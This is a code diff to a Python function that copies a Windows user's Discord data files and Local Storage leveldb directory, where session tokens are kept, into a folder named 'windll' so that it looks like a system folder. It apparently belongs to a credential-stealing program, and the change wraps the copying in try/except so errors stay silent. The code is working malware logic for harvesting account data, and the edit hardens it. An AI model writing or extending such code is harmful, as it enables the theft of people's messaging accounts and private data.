@@ -32,8 +32,11 @@ def Discord(data):
         pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
         makedirs(rf'{pathtofile}\windll\Messengers\Discord')
         user = environ['USERPROFILE'] + sep + r'AppData\Roaming'
-        copy2(user+ sep + path3,rf'{pathtofile}\windll\Messengers\Discord')# copy data
-        copy2(user+ sep + path1,rf'{pathtofile}\windll\Messengers\Discord')# copy data
+        try:
+            copy2(user+ sep + path3,rf'{pathtofile}\windll\Messengers\Discord')# copy data
+            copy2(user+ sep + path1,rf'{pathtofile}\windll\Messengers\Discord')# copy data
+        except:
+            pass
         try:
             copytree(user+ sep + path2,rf'{pathtofile}\windll\Messengers\Discord\Local Storage\leveldb')# copy dir
         except:
